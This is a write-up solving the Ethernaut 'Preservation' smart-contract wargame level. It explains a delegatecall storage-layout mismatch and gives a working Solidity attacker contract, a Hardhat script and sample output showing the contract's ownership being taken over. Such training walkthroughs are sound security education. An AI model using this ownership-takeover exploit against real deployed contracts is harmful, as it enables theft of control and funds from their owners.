# Preservation Strategy Guide

This project uses the Hardhat development environment to solve the Preservation challenge in [Ethernaut](https://ethernaut.openzeppelin.com/).

## Challenge Overview

The Preservation contract uses delegate calls (delegatecall) to implement timezone library functionality. This delegate call mechanism allows external library contracts to modify the calling contract's state. The problem is that there are potential security vulnerabilities in the contract implementation.

**Objective**: Gain ownership of the Preservation contract (become the owner).

## Vulnerability Analysis

Looking at the contract source code reveals:

```solidity
contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

Key vulnerability: When using `delegatecall`, the correspondence of storage slot positions is very important. When the Preservation contract calls the library contract's `setTime` function through delegatecall, although the code executes in the library contract's context, it modifies the Preservation contract's state.

The problem is that LibraryContract and Preservation have mismatched storage slot layouts:
- In the Preservation contract, the first storage slot is `timeZone1Library` (address)
- In the LibraryContract, the first storage slot is `storedTime` (uint256)

This means that when LibraryContract's `setTime` function modifies `storedTime`, it actually modifies Preservation's `timeZone1Library` variable.

## Attack Steps

1. Deploy a malicious library contract whose storage layout matches the Preservation contract
2. Call the `setFirstTime` function, passing in our malicious library contract address (converted to uint256)
3. Call `setFirstTime` again, this time it will execute our malicious library contract's `setTime` function
4. In the malicious `setTime` function, directly modify the `owner` variable to the attacker's address

## Project Structure

```
16-preservation/
├── contracts/
│   ├── Preservation.sol        # Original challenge contract
│   └── PreservationAttacker.sol # Attack contract
├── scripts/
│   └── deploy_PreservationAttacker.ts # Deployment and attack script
├── hardhat.config.ts           # Hardhat configuration
└── README.md                   # This document
```

## Contract Implementation

Our attack contract is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    // Ensure storage layout matches Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservation public preservation;

    constructor(address _preservation) {
        preservation = IPreservation(_preservation);
    }

    function attack() public {
        // Step 1: Change timeZone1Library to our attack contract address
        preservation.setFirstTime(uint256(uint160(address(this))));
        // Step 2: Execute our setTime function to change owner
        preservation.setFirstTime(1); // Parameter doesn't matter
    }

    function setTime(uint256 _timeStamp) public {
        owner = tx.origin; // Change contract owner to our address
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}
```

## Environment Setup

### Prerequisites

- Node.js 16+
- npm or yarn
- MetaMask wallet
- Some testnet ETH (e.g., Sepolia)

### Installation Steps

1. Clone the project
```bash
git clone https://github.com/your-username/ethernaut-solutions.git
cd ethernaut-solutions/16-preservation
```

2. Install dependencies
```bash
npm install
# or use yarn
yarn install
```

## Execute Attack Script

We use Hardhat scripts to solve the challenge:

```typescript
import hre from "hardhat";
const { ethers } = hre;

// Change to your target contract address
const CONTRACT_ADDRESS = "YOUR_PRESERVATION_INSTANCE_ADDRESS";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("My account address: ", signer.address);

    const preservation = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS);
    console.log("Preservation level instance address: ", CONTRACT_ADDRESS);
    console.log("Current Preservation owner: ", await preservation.owner());

    // =========Attack begins===========
    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    const preservationAttacker = await PreservationAttacker.deploy(CONTRACT_ADDRESS);
    await preservationAttacker.waitForDeployment();
      
    console.log("PreservationAttacker Contract deployed to: ", await preservationAttacker.getAddress());
    console.log("Current PreservationAttacker owner: ", await preservationAttacker.owner());
    
    const tx = await preservationAttacker.attack();
    await tx.wait();

    console.log("Current Preservation owner: ", await preservation.owner());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

Change CONTRACT_ADDRESS to the instance address on the Ethernaut platform, then execute:

```bash
npx hardhat run scripts/deploy_PreservationAttacker.ts --network sepolia
```

Example execution result:
```
My account address:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
Preservation level instance address:  0x54058aA94F43E509Ad7B3D305aF9d612133f7907
Current Preservation owner:  0x35b28CB86846382Aa6217283F12C13657FF0110B
PreservationAttacker Contract deployed to:  0xC85d492a8Da94fdd05E2BdCA39B8b725fA1602D2
Current PreservationAttacker owner:  0x0000000000000000000000000000000000000000
Current Preservation owner:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
```

After a successful attack, the Preservation contract's owner will change to our address, then you can return to the Ethernaut platform to submit the instance.

## Learning Points

1. **Dangers of delegatecall**: When using delegatecall, the called contract's code executes in the calling contract's context and can modify the calling contract's storage.

2. **Importance of storage slot position consistency**: When using delegatecall, you must ensure that the calling contract and called contract have consistent storage layouts, otherwise unexpected state changes will occur.

3. **Contract security design principles**:
   - Don't use delegatecall on untrusted external contracts
   - Ensure library contracts are secure and reliable when using them
   - Consider storage layout consistency when implementing library contracts

4. **Contract upgrade risks**: This vulnerability demonstrates the risks that may exist in contract upgrade mechanisms (such as proxy patterns).

## References

- [Solidity Official Documentation - Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [Ethernaut - Preservation Challenge](https://ethernaut.openzeppelin.com/level/16)
- [Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/)
